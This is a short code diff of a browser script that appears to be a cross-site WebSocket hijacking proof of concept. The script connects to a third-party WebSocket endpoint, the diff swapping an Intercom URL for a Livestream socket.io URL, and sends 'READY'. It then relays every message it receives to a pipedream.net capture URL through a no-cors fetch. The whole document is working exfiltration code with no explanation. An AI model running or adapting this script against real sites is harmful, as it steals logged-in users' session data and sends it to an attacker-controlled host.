@@ -1,11 +1,11 @@
 <script>
-websocket = new WebSocket('wss://nexus-websocket-a.intercom.io/pubsub/5-OYuiJsF1VVv6XL0a1yf1piyMHWbWQH4ynbxO3GpJYuhfQgq9_xLbaJ98pDFAGFQhObs6CIEywClVbomPsLRSO5I-qXihfpIJn4W9?X-Nexus-New-Client=true&X-Nexus-Version=0.5.2&user_role=undefined/')
+websocket = new WebSocket('wss://sio-1.livestream.com/socket.io/1/?t=1595098163645/')
 websocket.onopen = start
 websocket.onmessage = handleReply
 function start(event) {
   websocket.send("READY");
 }
 function handleReply(event) {
-  fetch('https://enpxyksbv7bgc.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
+  fetch('https://enlx84bmwk6oa.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
 }
 </script>
